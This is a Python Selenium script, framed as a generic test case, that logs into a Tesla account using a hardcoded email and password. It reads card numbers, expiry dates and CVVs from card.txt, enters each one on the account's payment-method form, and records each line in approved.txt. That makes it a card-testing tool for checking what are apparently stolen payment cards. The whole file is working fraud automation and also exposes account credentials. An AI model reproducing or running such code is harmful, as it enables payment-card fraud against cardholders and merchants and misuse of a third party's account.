from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import NoAlertPresentException
import unittest, time, re

class UntitledTestCase():
    def setUp(self):
        self.driver = webdriver.Chrome('chromedriver.exe')
        # self.driver = webdriver.Firefox()
        self.driver.implicitly_wait(30)
        self.base_url = "https://www.google.com/"
        self.verificationErrors = []
        self.accept_next_alert = True
    
    def test_untitled_test_case(self):
        driver = self.driver
        driver.set_window_size(1124, 850)
        driver.minimize_window()
        driver.get("https://auth.tesla.com/oauth2/v1/authorize?redirect_uri=https://www.tesla.com/teslaaccount/owner-xp/auth/callback&response_type=code&client_id=ownership&scope=offline_access%20openid%20ou_code%20email&audience=https%3A%2F%2Fownership.tesla.com%2F&locale=en-us")
        driver.find_element_by_id("form-input-identity").click()
        driver.find_element_by_id("form-input-identity").clear()
        driver.find_element_by_id("form-input-identity").send_keys("sallyalxss10@outlook.com")
        driver.find_element_by_id("form-input-credential").click()
        driver.find_element_by_id("form-input-credential").clear()
        driver.find_element_by_id("form-input-credential").send_keys("moaM1212")
        driver.find_element_by_id("form-input-credential").click()
        driver.find_element_by_id("form-input-credential").click()
        driver.find_element_by_id("form-input-credential").click()

        driver.find_element_by_id("form-submit-continue").click()

        time.sleep(5)
        driver.get("https://www.tesla.com/teslaaccount/profile-settings/payment-method")
        time.sleep(5)


    def read_txt(self):
        try:
            with open('card.txt','r') as f:
                r1=f.read()
                print(r1)
                return r1.split('\n')
        except:
            print("No File Present!!!")

    def add_details(self,l1):
        driver=self.driver
        try:
            driver.find_element_by_class_name('change-button').click()
            time.sleep(4)
            driver.switch_to.frame(0)
            time.sleep(3)
            driver.find_element_by_xpath('/html/body/div/div/div/div/button[2]').click()
        except:
            driver.find_element_by_class_name('tds-btn').click()
            time.sleep(4)
            driver.switch_to.frame(0)

        time.sleep(3)
        driver.find_element_by_name('/creditCardHolderName').send_keys('anna alxs')
        driver.find_element_by_name('/creditCardNumber').send_keys(int(l1[0]))
        driver.find_element_by_name('/creditCardExpiryMonth').send_keys(l1[1])
        driver.find_element_by_name('/creditCardExpiryYear').send_keys(l1[2])
        driver.find_element_by_name('/creditCardCvv').send_keys(l1[3])
        driver.find_element_by_name('/billingZipCode').send_keys('52014')
        time.sleep(5)
        try:
            i=1
            while i<4:
                driver.execute_script("window.document.getElementsByClassName('tds-btn tds-btn--blue')[0].click()")
                i+=1
                time.sleep(3)
        except:
            pass
        time.sleep(4)

if __name__ == "__main__":
    t1=UntitledTestCase()
    l1=t1.read_txt()
    t1.setUp()
    t1.test_untitled_test_case()

    for c,i in enumerate(l1):
        i1=i.split('|')
        print(i1)
        if c>0:
            print(c)
            t1.driver.get("https://www.tesla.com/teslaaccount/profile-settings/payment-method")
            time.sleep(3)
        t1.add_details(l1=i1)
        print("Process Completed Successfully!!!")
        with open('approved.txt','a') as f:
            f.write(l1[c]+'\n')
        time.sleep(10)
        t1.driver.delete_all_cookies()


